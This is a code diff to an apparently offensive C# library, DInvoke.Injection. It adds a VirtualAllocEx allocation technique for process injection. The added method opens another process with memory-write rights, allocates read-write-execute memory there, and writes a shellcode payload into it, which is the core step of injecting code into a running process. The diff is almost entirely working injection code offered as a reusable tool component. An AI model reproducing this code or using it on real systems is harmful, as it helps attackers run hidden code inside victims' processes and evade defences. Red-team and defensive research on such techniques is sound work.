@@ -289,4 +289,71 @@ namespace DInvoke.Injection
             return DynamicInvoke.Native.NtUnmapViewOfSection(hProc, baseAddr);
         }
     }
+
+
+
+
+    public class VirtualAllocEx : AllocationTechnique
+    {
+
+        /// <summary>
+        /// Default constructor.
+        /// </summary>
+        /// 
+        public VirtualAllocEx()
+        {
+            DefineSupportedPayloadTypes();
+        }
+
+
+        /// <summary>
+        /// States whether the payload is supported.
+        /// </summary>
+        /// <author>The Wover (@TheRealWover)</author>
+        /// <param name="Payload">Payload that will be allocated.</param>
+        /// <returns></returns>
+        public override bool IsSupportedPayloadType(PayloadType Payload)
+        {
+            return supportedPayloads.Contains(Payload.GetType());
+        }
+
+        /// <summary>
+        /// Internal method for setting the supported payload types. Used in constructors.
+        /// Update when new types of payloads are added.
+        /// </summary>
+        /// <author>The Wover (@TheRealWover)</author>
+        internal override void DefineSupportedPayloadTypes()
+        {
+            //Defines the set of supported payload types.
+            supportedPayloads = new Type[] {
+                typeof(PICPayload)
+            };
+        }
+
+        /// <summary>
+        /// Allocate the payload in the target process.
+        /// </summary>
+        /// <param name="Payload">The PIC payload to allocate to the target process.</param>
+        /// <param name="Process">The target process.</param>
+        /// <returns>Base address of allocated memory within the target process's virtual memory space.</returns>
+        /// 
+        public IntPtr Allocate(PICPayload Payload, Process Process)
+        {
+            if (!IsSupportedPayloadType(Payload))
+            {
+                throw new PayloadTypeNotSupported(Payload.GetType());
+            }
+            // Get a convenient handle for the target process.
+            IntPtr procHandle = DynamicInvoke.Win32.OpenProcess(Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_VM_OPERATION | Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_VM_WRITE | Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_VM_READ, false, (uint)Process.Id);
+            //create a IntPtr to return the base address of the allocated mem
+            IntPtr alloc = DynamicInvoke.Win32.VirtualAllocEx(procHandle, IntPtr.Zero, (uint)Payload.Payload.Length, Data.Win32.Kernel32.MEM_COMMIT | Data.Win32.Kernel32.MEM_RESERVE, Data.Win32.WinNT.PAGE_EXECUTE_READWRITE);
+            UIntPtr bytesWritten = UIntPtr.Zero;
+            Boolean success = DynamicInvoke.Win32.WriteProcessMemory(procHandle, alloc, Payload.Payload, (uint)Payload.Payload.Length, out bytesWritten);
+            if (success)
+                return alloc;
+            else
+                throw new Exception("an error occured trying to write memory into the process.");
+        }
+    }
+
 }
